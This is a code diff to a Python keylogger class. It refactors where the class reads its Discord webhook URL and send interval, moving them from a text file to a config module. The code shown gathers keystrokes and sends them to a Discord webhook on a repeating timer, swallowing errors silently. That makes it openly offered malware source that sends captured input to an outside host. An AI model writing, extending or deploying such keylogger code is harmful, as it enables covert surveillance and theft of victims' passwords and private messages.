@@ -4,24 +4,17 @@ from discord import SyncWebhook, File
 import discord
 import threading
 import socket
+from config import WEBHOOK_KEYLOGGER, INTERVAL
+
 
 class Keylogger:
     def __init__(self):
-        try:
-            with open("todo.txt", "r") as f:
-                lines = f.readlines()
-                self.url = lines[1].strip()
-                self.interval = int(lines[2])
-                f.close()
-        except:
-            pass
-
         self.keys = ""
 
     def send(self):
         try:
             try:
-                webhook = SyncWebhook.from_url(self.url)#https://discord.com/api/webhooks/ID/TOKEN
+                webhook = SyncWebhook.from_url(WEBHOOK_KEYLOGGER)#https://discord.com/api/webhooks/ID/TOKEN
             except:
                 return
 
@@ -45,7 +38,7 @@ class Keylogger:
             pass
         finally:
             try:
-                timer = threading.Timer(self.interval, self.send)
+                timer = threading.Timer(INTERVAL, self.send)
                 timer.start()
             except:
                 pass
